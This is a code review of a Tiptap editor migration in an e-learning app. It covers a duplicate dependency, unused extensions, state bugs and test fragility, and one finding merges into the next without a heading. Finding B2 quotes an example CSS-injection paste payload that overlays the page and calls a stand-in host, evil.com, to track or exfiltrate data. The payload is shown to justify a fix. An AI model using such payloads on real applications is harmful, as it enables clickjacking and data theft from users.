## What Works Well

1. **Solid Tiptap migration from markdown.** The old ReactMarkdown + Textarea dual-tab approach is cleanly replaced with a single Tiptap `EditorContent` surface. The `useEditor` configuration is well-structured, the debounced autosave with max-wait pattern is correct, and the unmount cleanup via `editorRef` is a smart solution to the stale-ref problem.

2. **Good WCAG touch target compliance.** `ToolbarButton` uses `size-11` (44px) consistently, `aria-pressed` is set for toggle state, `focus-visible:ring-2` provides keyboard focus indicators, and the `Separator` components use `decorative={false}` so screen readers can perceive toolbar group boundaries. This addresses multiple findings from the S01 review.

3. **Link dialog is a genuine improvement.** Replacing `window.prompt()` with a proper shadcn `Dialog` adds URL validation (regex whitelist), keyboard support (Enter to submit), an accessible description, and a "Remove Link" option. The pre-fill logic for existing links is a nice UX touch.

## Findings

### Blockers

#### B1: `@tiptap/extension-link` still in `package.json` (pre-flight AC not met)

**`package.json:33`**

```json
"@tiptap/extension-link": "^3.20.0",
```

The story's pre-flight fixes explicitly require: *"Remove `@tiptap/extension-link` from package.json (duplicate -- StarterKit bundles it)."* This was flagged in the S01 code review, documented in the story file (Task 1a), and confirmed by `npm ls @tiptap/extension-link` showing StarterKit already depends on it. The direct dependency is still present.

**Why it matters**: Duplicate extension registrations can cause Tiptap schema conflicts (duplicate marks/nodes). While it's currently deduped at the npm level, a version drift between the direct dep and StarterKit's transitive dep would cause runtime errors for learners.

**Fix**: Remove `@tiptap/extension-link` from `package.json` dependencies and run `npm install`.

#### B2: `Highlight.configure({ multicolor: true })` enables CSS injection via pasted content

**`/Volumes/SSD/Dev/Apps/Elearningplatformwireframes/src/app/components/notes/NoteEditor.tsx:152`**

```typescript
Highlight.configure({ multicolor: true }),
```

With `multicolor: true`, the Highlight extension's `renderHTML` outputs:

```javascript
style: `background-color: ${attributes.color}; color: inherit`
```

The `color` attribute is parsed from `element.getAttribute("data-color") || element.style.backgroundColor` with **no sanitization**. A user pasting HTML like `<mark data-color="red; position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:9999; background:url('https://evil.com/track?data=')">text</mark>` would inject arbitrary CSS into the rendered document. ProseMirror's DOMParser preserves `<mark>` elements and their attributes.

Meanwhile, the toolbar only ever calls `toggleHighlight()` with no color argument (default yellow). There is **no UI** for selecting highlight colors, so `multicolor: true` provides zero user-facing benefit while opening an attack surface.

**Why it matters**: CSS injection can overlay UI elements to trick learners (clickjacking), exfiltrate data via `background-image: url()`, or disrupt the layout. The content is persisted to IndexedDB and re-rendered on every load.

**Fix**: Change to `Highlight.configure({ multicolor: false })` (or just `Highlight`). The CSS in `index.css` already handles the default yellow background via `.tiptap mark { background-color: #fef08a; }`.

### High Priority

#### H1: `TextStyle` and `Color` extensions are imported and registered but never used

**`/Volumes/SSD/Dev/Apps/Elearningplatformwireframes/src/app/components/notes/NoteEditor.tsx:12`, `/Volumes/SSD/Dev/Apps/Elearningplatformwireframes/src/app/components/notes/NoteEditor.tsx:158-159`**

```typescript
import { TextStyle, Color } from '@tiptap/extension-text-style'
// ...
TextStyle,
Color,
```

Neither `TextStyle` nor `Color` is invoked anywhere in the toolbar or component logic. There is no `setColor()`, `setTextStyle()`, or any UI to select text colors. These extensions add ~580KB of node_modules bulk and register additional `parseHTML` rules that accept arbitrary `style` attributes from pasted content (same CSS injection vector as B2 -- `style: \`color: ${attributes.color}\``).

**Why it matters**: Unnecessary Tiptap extensions increase bundle size, expand the paste-parsing attack surface, and confuse future maintainers who see registered extensions with no UI.

**Fix**: Remove the `TextStyle` and `Color` imports and their registration in the `extensions` array. If text color support is needed later, add it with a proper color picker UI and input sanitization.

#### H2: Hardcoded `#fef08a` hex color in CSS violates design token convention

**`/Volumes/SSD/Dev/Apps/Elearningplatformwireframes/src/styles/index.css:67`**

```css
.tiptap mark {
  background-color: #fef08a;
  border-radius: 2px;
  padding: 0 2px;
}
```

The project convention (documented in CLAUDE.md and `theme.css`) requires all colors to use CSS custom properties or Tailwind tokens. `#fef08a` is Tailwind's `yellow-200` but hardcoded as a hex literal.

**Why it matters**: If the project adds dark mode theming, this highlight color won't adapt. Learners using dark mode would see bright yellow highlights with poor contrast against dark backgrounds.

**Fix**: Use a CSS variable:
```css
.tiptap mark {
  background-color: var(--color-highlight, oklch(0.96 0.10 95)); /* yellow-200 equivalent */
}
```
Or reference the Tailwind token: `background-color: var(--color-yellow-200);`

#### H3: `handleNoteChange` in LessonPlayer no longer calls `setNoteText` -- stale note on tab switch

**`/Volumes/SSD/Dev/Apps/Elearningplatformwireframes/src/app/pages/LessonPlayer.tsx:242-246`**

```typescript
const handleNoteChange = (value: string, tags: string[] = []) => {
  if (courseId && lessonId) {
    saveNote(courseId, lessonId, value, tags)
  }
}
```

Previously, `handleNoteChange` called `setNoteText(value)` to keep LessonPlayer's `noteText` state in sync with the editor content. The removal means `noteText` stays at its initial value from `getNote()`. If a learner edits a note, navigates away from the Notes tab (e.g., to Bookmarks), then returns to Notes, the `NoteEditor` receives the stale `initialContent={noteText}` -- but the `setContent` guard at line 222 (`if (currentHtml !== initialContent)`) may or may not trigger depending on timing.

More critically, if a learner navigates to a **different lesson** within the same course, `noteText` is still the old lesson's content until the `getNote` promise resolves (line 108). During that window, the editor shows the wrong lesson's notes.

**Why it matters**: Learners could see stale or wrong-lesson notes, leading to confusion and potential data loss if they start editing before the async load completes.

**Fix**: Restore `setNoteText(value)` in `handleNoteChange`, or better, derive `noteText` from NoteEditor's own state and remove the parent-level tracking entirely.

### Medium

#### M1: `Separator` role count in E2E test is viewport-fragile

**`/Volumes/SSD/Dev/Apps/Elearningplatformwireframes/tests/e2e/story-3-11.spec.ts:63`**

```typescript
const separators = toolbar.locator('[role="separator"]')
await expect(separators).toHaveCount(4) // Inline | Block | Lists | Code | Links
```

There are 4 `Separator` components in the toolbar, but one (between Block and Lists groups at line 381) is inside `<div className="hidden sm:flex ...">`. At viewports below `sm` (640px), only 3 separators are visible in the DOM's rendered tree. However, Radix `Separator` still emits the `role="separator"` attribute on a hidden element -- so the locator finds 4 regardless of visibility. This works accidentally. If the hidden wrapper is changed to `display: none` or conditional rendering, this test breaks.

**Fix**: Use `toolbar.locator('[role="separator"]:visible')` for explicit intent, or add a comment explaining why the count is 4 regardless of viewport.

**`/Volumes/SSD/Dev/Apps/Elearningplatformwireframes/tests/e2e/story-3-11.spec.ts`** (315 lines) vs **`/Volumes/SSD/Dev/Apps/Elearningplatformwireframes/tests/e2e/regression/story-3-11.spec.ts`** (340 lines)

The regression spec also has a more precise highlight test (selecting a specific word "this" rather than Cmd+A). These are functionally different test suites pretending to cover the same ACs.

**Why it matters**: The regression spec was the original ATDD contract. The active spec simplified the setup but also weakened test precision (Ctrl+A select-all is less realistic than selecting a specific word). When this story ships and the active spec moves to regression, someone needs to decide which version to keep.

**Fix**: Reconcile the two specs before merge. The active spec's static-course approach is simpler and should be the canonical version, but adopt the regression spec's more precise highlight selection test.
